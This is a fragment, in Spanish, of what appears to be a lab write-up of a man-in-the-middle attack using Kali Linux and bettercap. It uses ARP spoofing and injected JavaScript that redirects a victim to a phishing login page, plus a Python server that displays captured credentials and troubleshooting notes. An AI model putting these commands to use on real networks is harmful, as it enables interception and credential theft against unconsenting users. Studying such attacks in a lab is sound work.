...
git clone https://github.com/aircrack-ng/rtl8188eus cd rtl8188eus sudo make dkms_install
...
window.location.href = 'http://10.0.2.6/login.html';


**Servidor Inteligente (`server.py`):**
Script en Python para levantar un puerto 80 y mostrar credenciales capturadas en consola.
...
set http.proxy.injectjs /home/kali/inyectar.js set http.proxy.ignore 10.0.2.6 # Evitar autoinyección (Loop) set http.proxy.inject.getonly true # Prevenir errores de reenvío POST

4. Iniciar ataque
http.proxy on arp.spoof on
...
1.  **Conflicto Puerto 80:** Kali Linux inicia `apache2` por defecto.
    * *Solución:* `sudo systemctl stop apache2 && sudo systemctl disable apache2`.
2.  **Fallo de Tráfico en la Víctima (Connection Refused):** A pesar de activar `ip_forward`, la víctima no navegaba.
    * *Diagnóstico:* Se detectó que **UFW (Uncomplicated Firewall)** estaba bloqueando el tráfico de reenvío.
    * *Solución:* `sudo ufw disable`.
3.  **Bettercap Bugs:** La versión de repositorio de Kali presentaba fallos en `http.proxy`.
    * *Solución:* Instalación manual de la última versión desde GitHub (v2.33.0+).
4.  **Bucle Infinito de Redirección:** El script JS se inyectaba en la propia página de phishing.
